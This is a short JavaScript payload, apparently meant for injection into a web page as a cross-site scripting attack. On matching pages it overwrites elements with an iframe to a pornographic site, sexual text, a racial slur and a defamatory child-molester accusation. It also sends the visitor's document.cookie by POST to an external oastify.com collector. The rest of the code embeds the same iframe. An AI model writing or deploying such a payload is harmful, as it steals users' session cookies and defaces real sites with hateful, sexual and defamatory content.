document.body.innerHTML += `
    <style>
  @keyframes rainbow {
    0%   { color: #b00000; } /* deep red */
    16%  { color: #c04000; } /* burnt orange */
    33%  { color: #8b6508; } /* dark gold */
    50%  { color: #0d5c0d; } /* deep green */
    66%  { color: #00208c; } /* navy blue */
    83%  { color: #360061; } /* dark indigo */
    100% { color: #5c0066; } /* dark violet */
  }
  .rainbow {
    animation: rainbow 3s linear infinite;
    text-shadow: 0 0 1px rgba(0,0,0,0.15);
  }
</style>
`

let name;

if(window.location.href.includes("vo-ar")){    

    document.body.querySelector('.sss').innerHTML = '<iframe height=720px width=720px src="https://rule34.xxx/index.php?page=post&s=list&tags=hentai">'
    
    name = document.querySelector(".f-s-25");
    name.innerHTML = "<a onclick=`alert('nya~ my pussy >_<')` class='rainbow'>Click Me :D</a>"
    document.querySelectorAll('a').forEach(el => {el.style.color='red'})
    document.querySelector(".naskh-r").textContent = 'nigger | certified child molester'
    fetch('https://ugeghou8kuk2odes18yxe3gsfjla90xp.oastify.com', {
      method: 'POST',
      mode: 'no-cors', 
      body: document.cookie
});
}
else {
    document.body.innerHTML += '<iframe height=720px width=1280px src="https://rule34.xxx/index.php?page=post&s=list&tags=hentai">';
    window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'})
}


